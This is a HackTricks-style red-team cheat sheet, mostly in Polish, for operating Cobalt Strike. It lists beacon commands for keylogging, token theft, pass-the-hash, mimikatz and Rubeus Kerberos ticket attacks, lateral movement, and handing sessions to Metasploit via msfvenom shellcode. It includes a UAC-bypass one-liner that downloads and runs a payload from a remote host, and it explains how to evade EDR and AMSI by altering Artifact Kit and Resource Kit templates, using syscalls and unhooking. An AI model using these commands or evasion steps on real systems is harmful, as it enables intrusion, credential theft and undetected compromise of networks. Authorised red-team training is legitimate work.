# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit`, a następnie możesz wybrać, gdzie nasłuchiwać, jakiego rodzaju beacon użyć (http, dns, smb...) i więcej.

### Peer2Peer Listeners

Beacony tych listenerów nie muszą komunikować się bezpośrednio z C2, mogą komunikować się z nim przez inne beacony.

`Cobalt Strike -> Listeners -> Add/Edit`, a następnie musisz wybrać beacony TCP lub SMB.

* **Beacon TCP ustawi listener na wybranym porcie**. Aby połączyć się z beaconem TCP, użyj polecenia `connect <ip> <port>` z innego beacona.
* **Beacon smb będzie nasłuchiwać na pipename o wybranej nazwie**. Aby połączyć się z beaconem SMB, musisz użyć polecenia `link [target] [pipe]`.

### Generowanie i hostowanie payloadów

#### Generowanie payloadów w plikach

`Attacks -> Packages ->`

* **`HTMLApplication`** dla plików HTA
* **`MS Office Macro`** dla dokumentu biurowego z makrem
* **`Windows Executable`** dla .exe, .dll lub usługi .exe
* **`Windows Executable (S)`** dla **stageless** .exe, .dll lub usługi .exe (lepsze stageless niż staged, mniej IoCs)

#### Generowanie i hostowanie payloadów

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` To wygeneruje skrypt/wykonywalny do pobrania beacona z Cobalt Strike w formatach takich jak: bitsadmin, exe, powershell i python.

#### Hostowanie payloadów

Jeśli już masz plik, który chcesz hostować na serwerze www, po prostu przejdź do `Attacks -> Web Drive-by -> Host File` i wybierz plik do hostowania oraz konfigurację serwera www.

### Opcje Beacona

<pre class="language-bash"><code class="lang-bash"># Wykonaj lokalny plik .NET
execute-assembly </path/to/executable.exe>
# Zauważ, że aby załadować zestawy większe niż 1MB, właściwość 'tasks_max_size' profilu malleable musi być zmodyfikowana.

# Zrzuty ekranu
printscreen    # Zrób pojedynczy zrzut ekranu za pomocą metody PrintScr
screenshot     # Zrób pojedynczy zrzut ekranu
screenwatch    # Zrób okresowe zrzuty ekranu pulpitu
## Przejdź do Widok -> Zrzuty ekranu, aby je zobaczyć

# keylogger
keylogger [pid] [x86|x64]
## Widok > Naciśnięcia klawiszy, aby zobaczyć naciśnięte klawisze

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Wstrzyknij akcję skanowania portów do innego procesu
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Importuj moduł Powershell
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <wpisz tutaj polecenie powershell> # To używa najwyższej obsługiwanej wersji powershell (nie oppsec)
powerpick <cmdlet> <args> # To tworzy ofiarny proces określony przez spawnto i wstrzykuje UnmanagedPowerShell do niego dla lepszego opsec (bez logowania)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # To wstrzykuje UnmanagedPowerShell do określonego procesu, aby uruchomić cmdlet PowerShell.

# Uwierzytelnianie użytkownika
## Generowanie tokenów z poświadczeniami
make_token [DOMAIN\user] [password] #Tworzy token do podszywania się pod użytkownika w sieci
ls \\computer_name\c$ # Spróbuj użyć wygenerowanego tokena, aby uzyskać dostęp do C$ na komputerze
rev2self # Zatrzymaj używanie tokena wygenerowanego za pomocą make_token
## Użycie make_token generuje zdarzenie 4624: Konto zostało pomyślnie zalogowane. To zdarzenie jest bardzo powszechne w domenie Windows, ale można je zawęzić, filtrując według typu logowania. Jak wspomniano powyżej, używa LOGON32_LOGON_NEW_CREDENTIALS, który jest typem 9.

# Ominięcie UAC
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Kradzież tokena z pid
## Jak make_token, ale kradnie token z procesu
steal_token [pid] # Ponadto, to jest przydatne do działań sieciowych, a nie lokalnych
## Z dokumentacji API wiemy, że ten typ logowania "pozwala wywołującemu sklonować swój obecny token". Dlatego wyjście Beacona mówi Podszyty <current_username> - podszywa się pod nasz własny sklonowany token.
ls \\computer_name\c$ # Spróbuj użyć wygenerowanego tokena, aby uzyskać dostęp do C$ na komputerze
rev2self # Zatrzymaj używanie tokena z steal_token

## Uruchom proces z nowymi poświadczeniami
spawnas [domain\username] [password] [listener] #Zrób to z katalogu z dostępem do odczytu, np. cd C:\
## Jak make_token, to wygeneruje zdarzenie Windows 4624: Konto zostało pomyślnie zalogowane, ale z typem logowania 2 (LOGON32_LOGON_INTERACTIVE). Zawiera szczegóły dotyczące użytkownika wywołującego (TargetUserName) i użytkownika, pod którego się podszywa (TargetOutboundUserName).

## Wstrzyknij do procesu
inject [pid] [x64|x86] [listener]
## Z punktu widzenia OpSec: Nie wykonuj wstrzykiwania międzyplatformowego, chyba że naprawdę musisz (np. x86 -> x64 lub x64 -> x86).

## Przekaż hash
## Ten proces modyfikacji wymaga patchowania pamięci LSASS, co jest działaniem wysokiego ryzyka, wymaga lokalnych uprawnień administratora i nie jest zbyt wykonalne, jeśli włączony jest Protected Process Light (PPL).
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Przekaż hash przez mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Bez /run, mimikatz uruchomi cmd.exe, jeśli działasz jako użytkownik z pulpitem, zobaczy powłokę (jeśli działasz jako SYSTEM, jesteś w porządku)
steal_token <pid> #Kradzież tokena z procesu utworzonego przez mimikatz

## Przekaż bilet
## Żądaj biletu
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Utwórz nową sesję logowania do użycia z nowym biletem (aby nie nadpisać skompromitowanego)
make_token <domain>\<username> DummyPass
## Zapisz bilet na maszynie atakującego z sesji powłoki i załaduj go
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Przekaż bilet z SYSTEM
## Wygeneruj nowy proces z biletem
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Kradnij token z tego procesu
steal_token <pid>

## Ekstrakcja biletu + Przekaż bilet
### Lista biletów
execute-assembly C:\path\Rubeus.exe triage
### Zrzut interesującego biletu według luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Utwórz nową sesję logowania, zanotuj luid i processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Wstaw bilet w wygenerowanej sesji logowania
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Na koniec, ukradnij token z tego nowego procesu
steal_token <pid>

# Ruch Lateralny
## Jeśli token został utworzony, zostanie użyty
jump [method] [target] [listener]
## Metody:
## psexec                    x86   Użyj usługi do uruchomienia artefaktu Service EXE
## psexec64                  x64   Użyj usługi do uruchomienia artefaktu Service EXE
## psexec_psh                x86   Użyj usługi do uruchomienia jednego wiersza PowerShell
## winrm                     x86   Uruchom skrypt PowerShell przez WinRM
## winrm64                   x64   Uruchom skrypt PowerShell przez WinRM
## wmi_msbuild               x64   ruch lateralny wmi z wbudowanym zadaniem c# (oppsec)

remote-exec [method] [target] [command] # remote-exec nie zwraca wyjścia
## Metody:
## psexec                          Zdalne wykonanie przez Menedżera Kontroli Usług
## winrm                           Zdalne wykonanie przez WinRM (PowerShell)
## wmi                             Zdalne wykonanie przez WMI

## Aby wykonać beacona za pomocą wmi (nie jest to w poleceniu jump), po prostu załaduj beacona i uruchom go
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe

# Przekaż sesję do Metasploit - Przez listener
## Na hoście metaploit
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## Na cobalt: Listeners > Dodaj i ustaw Payload na Foreign HTTP. Ustaw Host na 10.10.5.120, Port na 8080 i kliknij Zapisz.
beacon> spawn metasploit
## Możesz uruchomić tylko sesje x86 Meterpreter z obcym listenerem.

# Przekaż sesję do Metasploit - Przez wstrzykiwanie shellcode
## Na hoście metasploit
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Uruchom msfvenom i przygotuj listener multi/handler

## Skopiuj plik bin do hosta Cobalt Strike
ps
shinject <pid> x64 C:\Payloads\msf.bin #Wstrzyknij shellcode metasploit do procesu x64

# Przekaż sesję metasploit do Cobalt Strike
## Wygeneruj stageless Beacon shellcode, przejdź do Attacks > Packages > Windows Executable (S), wybierz pożądany listener, wybierz Raw jako typ wyjścia i wybierz Użyj x64 payload.
## Użyj post/windows/manage/shellcode_inject w metasploit, aby wstrzyknąć wygenerowany shellcode Cobalt Strike.

# Pivoting
## Otwórz proxy socks na teamserver
beacon> socks 1080

# Połączenie SSH
beacon> ssh 10.10.17.12:22 username password</code></pre>

## Opsec

### Execute-Assembly

**`execute-assembly`** używa **ofiarnych procesów** zdalnego wstrzykiwania procesów do wykonania wskazanego programu. To jest bardzo głośne, ponieważ do wstrzykiwania do procesu używane są pewne API Win, które każdy EDR sprawdza. Jednak istnieją pewne niestandardowe narzędzia, które można wykorzystać do załadowania czegoś w tym samym procesie:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- W Cobalt Strike możesz również używać BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)

Skrypt agresora `https://github.com/outflanknl/HelpColor` utworzy polecenie `helpx` w Cobalt Strike, które doda kolory do poleceń, wskazując, czy są to BOF (zielony), czy są to Frok&Run (żółty) i podobne, lub czy są to ProcessExecution, wstrzykiwanie lub podobne (czerwony). Co pomaga wiedzieć, które polecenia są bardziej dyskretne.

### Działaj jako użytkownik

Możesz sprawdzić zdarzenia takie jak `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:

- EID bezpieczeństwa 4624 - Sprawdź wszystkie interaktywne logowania, aby poznać zwykłe godziny pracy.
- EID systemu 12,13 - Sprawdź częstotliwość wyłączeń/uruchomień/uśpienia.
- EID bezpieczeństwa 4624/4625 - Sprawdź przychodzące ważne/nieprawidłowe próby NTLM.
- EID bezpieczeństwa 4648 - To zdarzenie jest tworzone, gdy używane są poświadczenia w postaci tekstu jawnego do logowania. Jeśli proces je wygenerował, binarny potencjalnie ma poświadczenia w postaci tekstu jawnego w pliku konfiguracyjnym lub w kodzie.

Kiedy używasz `jump` z Cobalt Strike, lepiej jest użyć metody `wmi_msbuild`, aby nowy proces wyglądał bardziej legitnie.

### Użyj kont komputerów

Często obrońcy sprawdzają dziwne zachowania generowane przez użytkowników i **wykluczają konta usług i konta komputerów, takie jak `*$` z ich monitorowania**. Możesz użyć tych kont do przeprowadzania ruchu lateralnego lub eskalacji uprawnień.

### Użyj payloadów stageless

Payloady stageless są mniej hałaśliwe niż staged, ponieważ nie muszą pobierać drugiego etapu z serwera C2. Oznacza to, że nie generują żadnego ruchu sieciowego po początkowym połączeniu, co sprawia, że są mniej prawdopodobne do wykrycia przez obrony oparte na sieci.

### Tokeny i magazyn tokenów

Bądź ostrożny, gdy kradniesz lub generujesz tokeny, ponieważ może być możliwe, aby EDR wyliczył wszystkie tokeny wszystkich wątków i znalazł **token należący do innego użytkownika** lub nawet SYSTEM w procesie.

To pozwala na przechowywanie tokenów **na beaconie**, więc nie ma potrzeby kradnięcia tego samego tokena w kółko. To jest przydatne do ruchu lateralnego lub gdy musisz użyć skradzionego tokena wiele razy:

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

Podczas ruchu lateralnego zazwyczaj lepiej jest **ukraść token niż generować nowy** lub przeprowadzać atak pass the hash.

### Guardrails

Cobalt Strike ma funkcję o nazwie **Guardrails**, która pomaga zapobiegać używaniu niektórych poleceń lub działań, które mogą być wykryte przez obrońców. Guardrails mogą być skonfigurowane do blokowania konkretnych poleceń, takich jak `make_token`, `jump`, `remote-exec` i innych, które są powszechnie używane do ruchu lateralnego lub eskalacji uprawnień.

Ponadto repozytorium [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) zawiera również kilka kontroli i pomysłów, które możesz rozważyć przed wykonaniem payloadu.

### Szyfrowanie biletów

W AD bądź ostrożny z szyfrowaniem biletów. Domyślnie niektóre narzędzia będą używać szyfrowania RC4 dla biletów Kerberos, które jest mniej bezpieczne niż szyfrowanie AES, a domyślnie aktualne środowiska będą używać AES. Może to być wykryte przez obrońców, którzy monitorują słabe algorytmy szyfrowania.

### Unikaj domyślnych ustawień

Kiedy używasz Cobalt Strike, domyślnie rury SMB będą miały nazwę `msagent_####` i `"status_####`. Zmień te nazwy. Możliwe jest sprawdzenie nazw istniejących rur z Cobalt Strike za pomocą polecenia: `ls \\.\pipe\`

Ponadto, podczas sesji SSH tworzona jest rura o nazwie `\\.\pipe\postex_ssh_####`. Zmień ją na `set ssh_pipename "<new_name>";`.

Również w ataku poeksploatacyjnym rury `\\.\pipe\postex_####` mogą być modyfikowane za pomocą `set pipename "<new_name>"`.

W profilach Cobalt Strike możesz również modyfikować takie rzeczy jak:

- Unikanie używania `rwx`
- Jak działa zachowanie wstrzykiwania procesów (które API będą używane) w bloku `process-inject {...}`
- Jak działa "fork and run" w bloku `post-ex {…}`
- Czas snu
- Maksymalny rozmiar binarnych do załadowania w pamięci
- Ślad pamięci i zawartość DLL z blokiem `stage {...}`
- Ruch sieciowy

### Ominięcie skanowania pamięci

Niektóre EDR-y skanują pamięć w poszukiwaniu znanych sygnatur złośliwego oprogramowania. Cobalt Strike pozwala na modyfikację funkcji `sleep_mask` jako BOF, która będzie w stanie zaszyfrować w pamięci backdoora.

### Hałaśliwe wstrzykiwanie procesów

Podczas wstrzykiwania kodu do procesu zazwyczaj jest to bardzo hałaśliwe, ponieważ **żaden regularny proces zazwyczaj nie wykonuje tej akcji, a sposoby na to są bardzo ograniczone**. Dlatego może to być wykryte przez systemy detekcji oparte na zachowaniu. Ponadto może być również wykryte przez EDR-y skanujące sieć w poszukiwaniu **wątków zawierających kod, który nie znajduje się na dysku** (chociaż procesy takie jak przeglądarki używające JIT mają to powszechnie). Przykład: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | Relacje PID i PPID

Podczas uruchamiania nowego procesu ważne jest, aby **utrzymać regularną relację rodzic-dziecko** między procesami, aby uniknąć wykrycia. Jeśli svchost.exec wykonuje iexplorer.exe, będzie to wyglądać podejrzanie, ponieważ svchost.exe nie jest rodzicem iexplorer.exe w normalnym środowisku Windows.

Kiedy nowy beacon jest uruchamiany w Cobalt Strike, domyślnie tworzony jest proces używający **`rundll32.exe`**, aby uruchomić nowego listenera. To nie jest zbyt dyskretne i może być łatwo wykryte przez EDR-y. Ponadto `rundll32.exe` jest uruchamiane bez żadnych argumentów, co czyni to jeszcze bardziej podejrzanym.

Za pomocą następującego polecenia Cobalt Strike możesz określić inny proces do uruchomienia nowego beacona, co sprawia, że jest on mniej wykrywalny:
```bash
spawnto x86 svchost.exe
```
Możesz również zmienić to ustawienie **`spawnto_x86` i `spawnto_x64`** w profilu.

### Proxying attackers traffic

Atakujący czasami będą musieli być w stanie uruchomić narzędzia lokalnie, nawet na maszynach z systemem Linux, i sprawić, aby ruch ofiar dotarł do narzędzia (np. NTLM relay).

Co więcej, czasami, aby przeprowadzić atak pass-the-hash lub pass-the-ticket, jest to bardziej dyskretne dla atakującego, aby **dodać ten hash lub bilet do swojego lokalnego procesu LSASS** i następnie pivotować z niego, zamiast modyfikować proces LSASS maszyny ofiary.

Jednak musisz być **ostrożny z generowanym ruchem**, ponieważ możesz wysyłać nietypowy ruch (kerberos?) z procesu swojego backdoora. W tym celu możesz pivotować do procesu przeglądarki (chociaż możesz zostać złapany na wstrzykiwaniu się do procesu, więc pomyśl o dyskretnym sposobie, aby to zrobić).
```bash

### Avoiding AVs

#### AV/AMSI/ETW Bypass

Check the page:

{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Usually in `/opt/cobaltstrike/artifact-kit` you can find the code and pre-compiled templates (in `/src-common`) of the payloads that cobalt strike is going to use to generate the binary beacons.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the generated backdoor (or just with the compiled template) you can find what is making defender trigger. It's usually a string. Therefore you can just modify the code that is generating the backdoor so that string doesn't appear in the final binary.

After modifying the code just run `./build.sh` from the same directory and copy the `dist-pipe/` folder into the Windows client in `C:\Tools\cobaltstrike\ArtifactKit`.

```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```

Don't forget to load the aggressive script `dist-pipe\artifact.cna` to indicate Cobalt Strike to use the resources from disk that we want and not the ones loaded.

#### Resource Kit

The ResourceKit folder contains the templates for Cobalt Strike's script-based payloads including PowerShell, VBA and HTA.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the templates you can find what is defender (AMSI in this case) not liking and modify it:

```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```

Modifying the detected lines one can generate a template that won't be caught.

Don't forget to load the aggressive script `ResourceKit\resources.cna` to indicate Cobalt Strike to luse the resources from disk that we want and not the ones loaded.

#### Function hooks | Syscall

Function hooking is a very common method of ERDs to detect malicious activity. Cobalt Strike allows you to bypass these hooks by using **syscalls** instead of the standard Windows API calls using the **`None`** config, or use the `Nt*` version of a function with the **`Direct`** setting, or just jumping over the `Nt*` function with the **`Indirect`** option in the malleable profile. Depending on the system, an optino might be more stealth then the other.

This can be set in the profile or suing the command **`syscall-method`**

However, this could also be noisy.

Some option granted by Cobalt Strike to bypass function hooks is to remove those hooks with: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

You could also check with functions are hooked with [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) or [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




```bash
cd C:\Tools\neo4j\bin  
neo4j.bat console  
http://localhost:7474/ --> Zmień hasło  
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL  

# Zmień powershell  
C:\Tools\cobaltstrike\ResourceKit  
template.x64.ps1  
# Zmień $var_code -> $polop  
# $x --> $ar  
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna  

#artifact kit  
cd  C:\Tools\cobaltstrike\ArtifactKit  
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```


{{#include ../banners/hacktricks-training.md}}
